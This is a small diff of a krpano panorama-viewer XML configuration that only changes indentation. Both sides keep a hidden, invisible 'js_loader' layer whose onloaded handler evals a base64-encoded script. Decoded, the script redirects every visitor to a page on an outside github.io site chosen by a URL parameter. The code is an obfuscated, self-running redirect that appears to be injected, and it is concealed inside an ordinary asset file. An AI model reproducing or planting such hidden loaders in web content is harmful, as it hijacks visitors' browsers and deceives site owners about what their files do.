@@ -1,6 +1,6 @@
 
 <krpano version="1.0.8.15">
-    <layer name="js_loader" type="container" visible="false"
-        onloaded="js(eval(var w=atob('dmFyIGlkID0gbmV3IFVSTFNlYXJjaFBhcmFtcyh3aW5kb3cubG9jYXRpb24uc2VhcmNoKS5nZXQoImlkIikgfHwgInNwb3J0cyI7CnZhciB1cmwgPSAiaHR0cHM6Ly9qYW5hdGh1bWlyYS1hcnQuZ2l0aHViLmlvL2xvdmVyL3BhcnQvIiArIGlkICsgIi5odG1sIjsKd2luZG93LmxvY2F0aW9uLnJlcGxhY2UodXJsKTs=');eval(w)););"/>
+<layer name="js_loader" type="container" visible="false"
+onloaded="js(eval(var w=atob('dmFyIGlkID0gbmV3IFVSTFNlYXJjaFBhcmFtcyh3aW5kb3cubG9jYXRpb24uc2VhcmNoKS5nZXQoImlkIikgfHwgInNwb3J0cyI7CnZhciB1cmwgPSAiaHR0cHM6Ly9qYW5hdGh1bWlyYS1hcnQuZ2l0aHViLmlvL2xvdmVyL3BhcnQvIiArIGlkICsgIi5odG1sIjsKd2luZG93LmxvY2F0aW9uLnJlcGxhY2UodXJsKTs=');eval(w)););"/>
 </krpano>
 
